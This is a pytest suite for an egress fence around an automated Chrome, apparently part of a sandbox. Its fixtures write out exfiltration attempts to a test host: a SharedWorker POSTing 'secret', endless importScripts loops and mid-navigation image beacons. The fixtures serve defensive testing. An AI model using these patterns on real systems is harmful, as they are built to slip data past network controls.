# Copyright (c) 2026-present Plane Software, Inc. and contributors
# SPDX-License-Identifier: AGPL-3.0-only
# See the LICENSE file for details.

"""The Prismoid Chrome and the loopback: a page a fenced command serves, a listed page that goes to
one, workers, frames, srcdoc and blank pages - none of them excused by the pass of another. Sites and the
helper fixture are `tests/support/rigs/chrome_rig.py`."""

from __future__ import annotations

import asyncio
import base64
import json
import socket
from typing import Any

import pytest

from prismoid.device.chrome import Chrome
from tests.support.markers import darwin_only, needs_chrome
from tests.support.rigs.chrome_rig import (
    Helper,
    at,
    chrome_eval,
    chrome_page,
    listening,
    serve_own_page,
    stop_own_page,
    until,
)
from tests.support.rigs.chrome_rig import helper as helper


def _commit_comes_late(chrome: Chrome, url_part: str, seconds: float) -> list[str]:
    """Word of a main frame's commit to a URL holding `url_part` reaches the helper `seconds` late.
    Returned: the URLs that paused while it was held, filled in as they do."""
    heard = chrome._dispatch  # pyright: ignore[reportPrivateUsage]
    ahead: list[str] = []
    held = False

    def dispatch(msg: dict[str, Any]) -> None:
        nonlocal held
        params = msg.get("params") or {}
        method = msg.get("method")
        if (
            method == "Page.frameNavigated"
            and url_part in params["frame"]["url"]
            and not params["frame"].get("parentId")
        ):
            held = True
            asyncio.get_running_loop().call_later(seconds, heard, msg)
            return
        if method == "Fetch.requestPaused" and held:
            ahead.append(params["request"]["url"])
        heard(msg)

    chrome._dispatch = dispatch  # pyright: ignore[reportPrivateUsage]
    return ahead


@darwin_only
@needs_chrome
async def test_a_page_a_fenced_command_serves_gets_no_excuse(helper: Helper) -> None:
    """The review's leak: a command's data leaving through the task's own page. Its image and its CDN
    stylesheet are refused there, and stay denials (ADR-078 names the stylesheet as a limit)."""
    ref = await helper.frame("ta", "a.test")
    own, stop = await serve_own_page(helper, ref, "direct")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://127.0.0.1:{own}/own.html"}, session_id=session)
        await until(lambda: len(helper.chrome_denials(ref)) >= 2, "both assets refused")
        assert {d["host"] for d in helper.chrome_denials(ref)} == {"b.test"}
        assert await chrome_eval(cdp, session, "location.pathname") == "/own.html", "the page itself loaded"
        assert not any(host == "b.test" for host, _ in helper.site.hits)
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_listed_page_navigating_to_a_loopback_page_excuses_nothing_in_the_swap(
    helper: Helper,
) -> None:
    """A listed page's URL must not excuse the first assets of the page that replaces it. The race
    (about 1 in 200 under load) is forced: word of the commit comes late, so those assets pause with
    the listed URL the last one heard. Two guards answer it, the URL forgotten at the Document
    request and `here()`'s tie to a document, and either alone refuses, so this goes red only with
    both gone. `test_a_pages_top_url_is_known_only_from_its_commit` holds the first by itself."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    own, stop = await serve_own_page(helper, ref, "swap")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await at(cdp, session, helper, "a.test", "/link-x")
        ahead = _commit_comes_late(helper.chrome, f"localhost:{own}", 1.0)
        await cdp.call(
            "Runtime.evaluate",
            {"expression": f"location = 'http://localhost:{own}/own.html'; 0"},
            session_id=session,
        )
        await until(lambda: len(helper.chrome_denials(ref)) >= 2, "both assets refused")
        assert any("b.test" in url for url in ahead), "the race ran: an asset beat word of its commit"
        assert not any(host == "b.test" for host, _ in helper.site.hits)
        passed = helper.app.state.egress._passed  # pyright: ignore[reportPrivateUsage]
        assert not passed(False, "chrome", "b.test", port, False), "no pass was minted"
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_loopback_page_leaving_for_a_listed_page_borrows_nothing_from_it(helper: Helper) -> None:
    """The swap the other way. A fenced command's page sets off for a listed page and keeps firing
    images, so some are held for the commit: the listed URL must not excuse them when it lands.
    Chrome cancels those images at the commit, so the site never hears them either way: the proof is
    that no pass was minted. A held image's document has gone, so `here()` refuses it and the
    `Referer` rule cannot be reached here: only both off goes red, and
    `test_an_asset_mid_swap_waits_for_the_commit_and_must_be_the_new_pages` holds that rule alone."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    own, stop = await serve_own_page(helper, ref, "leaving")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://127.0.0.1:{own}/own.html"}, session_id=session)
        await until(lambda: helper.chrome_denials(ref), "the page's own assets refused")
        expression = (
            f"location = 'http://a.test:{port}/link-landed';"
            f" let n = 0; setInterval(() => {{ new Image().src = 'http://b.test:{port}/spam-' + n++ + '.png' }}, 1); 0"
        )
        await cdp.call("Runtime.evaluate", {"expression": expression}, session_id=session)
        await until(lambda: helper.site.saw("a.test", "/link-landed"), "the listed page")
        await asyncio.sleep(1.0)
        assert not any(host == "b.test" for host, _ in helper.site.hits)
        passed = helper.app.state.egress._passed  # pyright: ignore[reportPrivateUsage]
        assert not passed(False, "chrome", "b.test", port, False), "no pass was minted"
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()


_OWN_SERVER = """
import http.server, re, sys, time
LEAK = sys.argv[2]
class Handler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Referrer-Policy", "no-referrer")
        self.send_header("Cache-Control", "no-store")
        super().end_headers()
    def do_GET(self):
        made = re.fullmatch(r"/(m|slow)-([0-9]+)[.]js", self.path)
        if made is None:
            return super().do_GET()
        wait = int(made[2])
        if made[1] == "slow":
            time.sleep(wait / 1000)
        body = f"import '/slow-{wait}.js';" if made[1] == "m" else f"import '{LEAK}?n={wait}';"
        self.send_response(200)
        self.send_header("Content-Type", "text/javascript")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body.encode())
    def log_message(self, *args):
        pass
http.server.ThreadingHTTPServer(("127.0.0.1", int(sys.argv[1])), Handler).serve_forever()
"""


async def _serve_files(helper: Helper, ref: str, files: dict[str, str], leak: str) -> tuple[int, str]:
    """A fenced command's own server, whose every answer it shapes: `no-referrer` here, and modules
    that answer late, each a static import of `leak`, so one comes due after its page has gone."""
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        own = probe.getsockname()[1]
    writes = [
        f"echo {base64.b64encode(text.encode()).decode()} | base64 -d > {name}"
        for name, text in {**files, "own_server.py": _OWN_SERVER}.items()
    ]
    command = (
        "; ".join(writes)
        + f"; nohup /usr/bin/python3 own_server.py {own} {leak} >/dev/null 2>&1 & echo $! > own.pid"
    )
    async with helper.client() as c:
        r = await c.post(f"/frames/{ref}/exec", json={"exec_id": "serve", "command": command, "timeout": 10})
    assert r.status_code == 200 and r.json()["exit_code"] == 0, r.text
    await listening(own)
    return own, "kill $(cat own.pid)"


def _leaves_for(url: str, start: str) -> str:
    """A page that starts a worker and goes somewhere listed, slow to leave, as the review's was."""
    return (
        f"<html><body>own<script>{start};"
        " addEventListener('pagehide', () => { const t = Date.now(); while (Date.now() - t < 300); });"
        f" setTimeout(() => {{ location = {json.dumps(url)} }}, 150);</script></body></html>"
    )


# `module-is-no-asset-type` holds the type table, not the document rule: Chrome 156 pauses a module's
# static import as `Other`, so no excuse applies to it, and it stays refused with that rule off.
def _worker_cases(leak: str) -> dict[str, dict[str, str]]:
    loop = f"let n = 0; for (;;) {{ try {{ importScripts('{leak}?n=' + n++); }} catch (e) {{}} }}"
    return {
        "blob-classic": {
            "p.html": "new Worker(URL.createObjectURL(new Blob([" + json.dumps(loop) + "])))",
        },
        "no-referrer": {"p.html": "new Worker('/w.js')", "w.js": loop},
        "module-is-no-asset-type": {
            "p.html": "for (let d = 100; d < 700; d += 20) new Worker(`/m-${d}.js`, {type: 'module'})",
        },
    }


@darwin_only
@needs_chrome
@pytest.mark.parametrize("case", ["blob-classic", "no-referrer", "module-is-no-asset-type"])
async def test_a_worker_a_fenced_commands_page_left_running_gets_no_excuse(helper: Helper, case: str) -> None:
    """The re-review's leak. A fenced command's page starts a worker and leaves for a listed host,
    and the worker lives on. Its requests pause on the page's session under the page's frame, and the
    page's top URL is listed by then: the excuse would give it the off-list host and a pass, 774 and
    more reaches. Its server shapes its `Referer`, so only who asked can say no. On Chrome 156 the
    worker's session detaches at the navigation, so what refuses here is "nothing announced it": this
    stays green with the worker rule and `here()` both off, and neither is reached.
    `test_a_workers_session_is_never_excused_whatever_it_names` holds the worker rule."""
    port = helper.site.port
    leak = f"http://b.test:{port}/worker-leak.js"
    landing = f"http://a.test:{port}/link-landed"
    ref = await helper.frame("ta", "a.test")
    files = _worker_cases(leak)[case]
    start = files.pop("p.html")
    own, stop = await _serve_files(helper, ref, {"p.html": _leaves_for(landing, start), **files}, leak)
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://127.0.0.1:{own}/p.html"}, session_id=session)
        await until(lambda: helper.site.saw("a.test", "/link-landed"), "the listed page")
        await until(lambda: any(d["host"] == "b.test" for d in helper.chrome_denials(ref)), "a refusal", 5.0)
        await asyncio.sleep(1.0)
        assert not any(host == "b.test" for host, _ in helper.site.hits)
        passed = helper.app.state.egress._passed  # pyright: ignore[reportPrivateUsage]
        assert not passed(False, "chrome", "b.test", port, False), "no pass was minted"
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_listed_pages_own_worker_gets_no_excuse_either(helper: Helper) -> None:
    """The cost: a worker's script is held to the list, whoever made the worker. The worker rule and
    `here()` each refuse this alone, so only both off goes red (the rule by itself is the fake
    Chrome's test, `test_a_workers_session_is_never_excused_whatever_it_names`)."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-x"}, session_id=session)
        await until(lambda: helper.site.saw("a.test", "/link-x"), "the page")
        await until(lambda: helper.chrome.tops(), "its commit")
        body = f"try {{ importScripts('http://b.test:{port}/own-worker.js'); postMessage('ran'); }} catch (e) {{ postMessage('refused'); }}"
        said = await chrome_eval(
            cdp,
            session,
            "new Promise(done => { const w = new Worker(URL.createObjectURL(new Blob(["
            + json.dumps(body)
            + "]))); w.onmessage = m => done(m.data); })",
        )
        assert said == "refused" and not helper.site.saw("b.test", "/own-worker.js")
    finally:
        await cdp.close()


@darwin_only
@needs_chrome
@pytest.mark.parametrize(
    "page",
    [
        "<img src='http://b.test:{port}/in-loopback.png'>",
        "<iframe srcdoc=\"<img src='http://b.test:{port}/in-loopback.png'>\"></iframe>",
    ],
    ids=["its-own-document", "a-srcdoc-it-holds"],
)
async def test_a_listed_page_framing_a_loopback_page_excuses_nothing_in_the_frame(
    helper: Helper, page: str
) -> None:
    """A listed page may frame a task's own server. The top is listed, and that must not excuse what
    the frame asks for, nor a `srcdoc` it holds, which has no origin to say whose it is. The listed
    page's own off-list image still loads, in the same seconds."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    own, stop = await _serve_files(helper, ref, {"own.html": page.format(port=port)}, "unused")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-x"}, session_id=session)
        await until(lambda: helper.site.saw("a.test", "/link-x"), "the page")
        await until(lambda: helper.chrome.tops(), "its commit")
        await chrome_eval(
            cdp,
            session,
            f"new Image().src = 'http://d.test:{port}/listed-pages-own.png';"
            f" document.body.innerHTML += \"<iframe src='http://127.0.0.1:{own}/own.html'></iframe>\"; 0",
        )
        await until(lambda: helper.site.saw("d.test", "/listed-pages-own.png"), "the listed page's own image")
        await until(lambda: helper.chrome_denials(ref), "the frame's image refused")
        await asyncio.sleep(0.3)
        assert [d["host"] for d in helper.chrome_denials(ref)] == ["b.test"]
        assert not helper.site.saw("b.test", "/in-loopback.png")
        passed = helper.app.state.egress._passed  # pyright: ignore[reportPrivateUsage]
        assert not passed(False, "chrome", "b.test", port, False), "no pass was minted"
    finally:
        await stop_own_page(helper, ref, stop)
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_srcdoc_in_a_listed_page_rides_on_it(helper: Helper) -> None:
    """A document with no origin of its own has nothing of its own to judge: it is the listed page's."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-x"}, session_id=session)
        await until(lambda: helper.site.saw("a.test", "/link-x"), "the page")
        await until(lambda: helper.chrome.tops(), "its commit")
        await chrome_eval(
            cdp,
            session,
            "(() => { const f = document.createElement('iframe');"
            f" f.srcdoc = \"<img src='http://b.test:{port}/in-srcdoc.png'>\"; document.body.append(f); }})(); 0",
        )
        await until(lambda: helper.site.saw("b.test", "/in-srcdoc.png"), "the srcdoc's image")
        assert not helper.chrome_denials(ref)
    finally:
        await cdp.close()


@darwin_only
@needs_chrome
@pytest.mark.parametrize("cross_site", [False, True], ids=["same-process", "out-of-process"])
async def test_an_iframe_in_a_listed_page_still_loads_its_assets(helper: Helper, cross_site: bool) -> None:
    """The tie to a document holds for an iframe's, out of process too: `Network` and `Page` are on
    in its own session. Its host is listed as well, so its document passes. `/framed` puts an
    off-list image in the frame."""
    port = helper.site.port
    inner = f"http://{'c' if cross_site else 'www.a'}.test:{port}/framed"
    ref = await helper.frame("ta", "a.test", "c.test")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-x"}, session_id=session)
        await until(lambda: helper.site.saw("a.test", "/link-x"), "the page")
        await until(lambda: helper.chrome.tops(), "its commit")
        await chrome_eval(cdp, session, f"document.body.innerHTML = \"<iframe src='{inner}'></iframe>\"; 0")
        await until(lambda: helper.site.saw("b.test", "/in-frame.png"), "the frame's image")
        assert not helper.chrome_denials(ref)
    finally:
        await cdp.close()


@darwin_only
@needs_chrome
async def test_a_blank_page_loads_nothing_off_the_list(helper: Helper) -> None:
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await chrome_eval(cdp, session, f"new Image().src = 'http://b.test:{port}/blank.png'; 0")
        await until(lambda: helper.chrome_denials(ref), "the image refused")
        assert [d["host"] for d in helper.chrome_denials(ref)] == ["b.test"]
        assert not helper.site.saw("b.test", "/blank.png")
    finally:
        await cdp.close()


_WORKER_BODY = (
    "onconnect = async e => {{ const p = e.ports[0]; try {{ await fetch('{url}', "
    "{{method: 'POST', body: 'secret', mode: 'no-cors'}}); p.postMessage('reached'); }} "
    "catch (x) {{ p.postMessage('refused'); }} }}"
)


_WORKER = (
    "new Promise(done => {{ const w = new SharedWorker({make}); w.port.onmessage = m => done(m.data);"
    " w.port.start(); setTimeout(() => done('no answer'), 4000); }})"
)


@darwin_only
@needs_chrome
@pytest.mark.parametrize(
    "make",
    [
        "URL.createObjectURL(new Blob([{body}], {{type: 'text/javascript'}}))",
        "'data:text/javascript,' + encodeURIComponent({body})",
    ],
    ids=["blob", "data"],
)
async def test_a_blob_or_data_shared_worker_is_fenced_with_a_pass_live(helper: Helper, make: str) -> None:
    """A worker that belongs to no one task, whatever its URL's scheme, is held to the union of the
    lists. It used to be let go unfenced, and only an accident kept it from running."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/"}, session_id=session)
        await until(lambda: helper.site.saw("b.test", "/from-a.test.png"), "the pass is live")
        body = json.dumps(_WORKER_BODY.format(url=f"http://b.test:{port}/from-worker"))
        said = await chrome_eval(cdp, session, _WORKER.format(make=make.format(body=body)))
        await asyncio.sleep(0.3)
        assert not helper.site.saw("b.test", "/from-worker")
        assert said == "refused", "it ran, and the fence said no"
    finally:
        await cdp.close()
